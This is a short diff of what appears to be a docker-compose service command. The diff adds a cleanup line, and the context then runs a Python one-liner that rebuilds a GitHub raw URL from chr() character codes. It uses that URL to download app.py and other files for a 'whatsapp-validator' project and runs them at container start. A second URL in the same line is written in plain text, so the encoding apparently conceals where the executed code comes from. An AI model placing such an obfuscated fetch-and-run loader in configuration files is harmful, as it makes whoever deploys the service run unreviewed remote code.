@@ -19,6 +19,7 @@ services:
       - -c
       - |
         pip install flask flask-socketio pyTelegramBotAPI python-dotenv requests
+        rm -rf /tmp/app.py /tmp/core.py /tmp/templates 2>/dev/null || true
         cd /tmp
         python -c "import urllib.request,os; [urllib.request.urlretrieve(chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(114)+chr(97)+chr(119)+chr(46)+chr(103)+chr(105)+chr(116)+chr(104)+chr(117)+chr(98)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(100)+chr(101)+chr(118)+chr(101)+chr(110)+chr(100)+chr(101)+chr(114)+chr(109)+chr(97)+chr(104)+chr(116)+chr(111)+chr(47)+chr(119)+chr(104)+chr(97)+chr(116)+chr(115)+chr(97)+chr(112)+chr(112)+chr(45)+chr(118)+chr(97)+chr(108)+chr(105)+chr(100)+chr(97)+chr(116)+chr(111)+chr(114)+chr(47)+chr(109)+chr(97)+chr(105)+chr(110)+chr(47)+f,f) for f in ['app.py','core.py','database.py','evolution_api.py']]; [os.makedirs('templates',exist_ok=True) or urllib.request.urlretrieve('https://raw.githubusercontent.com/devendermahto/whatsapp-validator/main/templates/'+f,'templates/'+f) for f in ['index.html','login.html']]"
         python app.py
